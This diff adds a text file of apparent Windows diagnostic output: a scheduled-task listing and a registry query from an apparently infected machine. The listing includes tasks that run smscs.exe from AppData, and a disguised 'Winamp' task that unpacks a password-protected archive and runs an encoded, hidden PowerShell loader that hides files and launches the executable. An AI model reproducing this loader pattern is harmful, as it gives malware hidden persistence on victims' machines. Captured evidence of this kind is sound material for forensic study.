@@ -1,0 +1,61 @@
+
+
+Action   : C:\Users\kouzm\AppData\Local\programs\common\smscs.exe
+Args     : 
+TaskName : cache
+
+Action   : %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe
+Args     : /reporting
+TaskName : OneDrive Reporting 
+           Task-S-1-5-21-3826591462-1902725790-3394240593-1001
+
+Action   : %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe
+Args     : 
+TaskName : OneDrive Standalone Update 
+           Task-S-1-5-21-3826591462-1902725790-3394240593-1001
+
+Action   : C:\Users\kouzm\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\One
+           DriveLauncher.exe
+Args     : /startInstances
+TaskName : OneDrive Startup Task-S-1-5-21-3826591462-1902725790-3394240593-1001
+
+Action   : C:\Users\kouzm\AppData\Local\Vivaldi\Application\update_notifier.exe
+Args     : --from-scheduler
+TaskName : VivaldiUpdateCheck-b979ca5e5ebd5df3
+
+Action   : {"C:\Users\kouzm\AppData\Local\Programs\Common\devlog", cmd}
+Args     : {x "C:\Users\kouzm\AppData\Local\Programs\Common\oldfile" -tzip 
+           -o"C:\Users\kouzm\AppData\Local\Programs\Common" -p1bdbf03F6000Af0f1
+           96f4a9A50C82Ec7aB66AcB4B3114D10Da8a1E3Ecf8F41aA0bCdb2802cd7F3a682CEb
+           8555A488cB4 -y, /c start /min powershell.exe -NoProfile 
+           -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBv
+           AG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAEkAZwBuAG8AcgBlACIACgAkAEQA
+           IAA9ACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABwAHIAbwBn
+           AHIAYQBtAHMAXABjAG8AbQBtAG8AbgAiAAoAJABSACAAPQAgACIAcwBtAHMAYwBzAC4A
+           ZQB4AGUAIgAKAGcAYwBpACAAJABEACAALQBGAGkAbABlACAALQBGAG8AcgBjAGUAIAB8
+           ACAAPwAgAHsAIAAkAF8ALgBFAHgAdABlAG4AcwBpAG8AbgAgAC0AZQBxACAAIgAiACAA
+           fQAgAHwAIAByAGkAIAAtAEYAbwByAGMAZQAKAGcAYwBpACAAJABEACAALQBGAGkAbABl
+           ACAALQBGAG8AcgBjAGUAIAB8ACAAJQAgAHsAIAAkAF8ALgBBAHQAdAByAGkAYgB1AHQA
+           ZQBzACAAPQAgACQAXwAuAEEAdAB0AHIAaQBiAHUAdABlAHMAIAAtAGIAbwByACAANgAg
+           AH0ACgAkAEUAIAA9ACAAZwBjAGkAIAAkAEQAIAAtAGYAaQAgACoALgBlAHgAZQAgAC0A
+           RgBpAGwAZQAgAC0ARgBvAHIAYwBlACAAfAAgAHMAbwByAHQAIABOAGEAbQBlACAAfAAg
+           AHMAZQBsAGUAYwB0ACAALQBmACAAMQAKAGkAZgAgACgAJABFACkAIAB7ACAAcgBlAG4A
+           IAAkAEUALgBGAHUAbABsAE4AYQBtAGUAIAAkAFIAIAAtAEYAbwByAGMAZQAgAH0ACgBT
+           AHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgAkAEQAXAAkAFIAIgA=}
+TaskName : WinampServiceInitializationTask
+
+Action   : C:\Users\kouzm\AppData\Local\programs\common\smscs.exe
+Args     : 
+TaskName : workerhost
+
+
+
+
+
+ reg.exe query "HKEY_LOCAL_MACHINE\SOFTWARE\1D0EC6DE-4A80-4CC3-A335-E6E41C951198"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\1D0EC6DE-4A80-4CC3-A335-E6E41C951198
+    144807F0-DE37-4C62-9C05-EB4CC64A7A2F    REG_SZ    86b8e38b-0fd0-4807-bdf9-c8854763bd1b
+    5FD38555-4B16-40AE-9A09-E2C969CB74AF    REG_SZ    43847B0CE6362A165A483BD213C8DB4B
+    8C5CFDF4-AB05-4EB0-8EF6-7B4620DC2CF3    REG_SZ    AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAOoJXZWw0vUKxB/NH5T4fNgQAAAACAAAAAAAQZgAAAAEAACAAAACH3nsMnlrYJG/mQfB4/K8xyarBbd/C2QgjF4X8/k5FugAAAAAOgAAAAAIAACAAAADSMfeC+3pn6ivnUp2uArlh4ld82tOkInqmvDbPLvRi9vAAAACT853kRuy1mMT9gkjDKs04FynJ+LI8mk2Xgh6btVneIjeB66WKy7xLN0ndN91EhvUbD2aqN1AAUJ9zfexSudddCbim3QuLRItN7oiPh7yRKB2VQoUEtZtV/bB4x4K7t5xpEpHAV5FUn+99LLljn5g+u20h5ZRQlUoWkOu2wBOpeo1VCqooug/otsY+KYpZKaC+VkgcAmeqZzPRggpF4yT1vgw0o0yQG7aiHda5NY+QG781yvqcLDG7RdXnjP68+VqzsRrH88Xh3vLsKH7vAYwZY89UoRivxQ8NJXROcVF8nuTPcHulQoKClV2lVRtpXHxAAAAAow+YDHZhMFnh0GOGu0rE0ZY0U7diLEaDuGHWMSq1Ojk2xsC+QF0vBqF/faVEcyn6UIMCkCRAua9g7eUlnC2opQ==
+
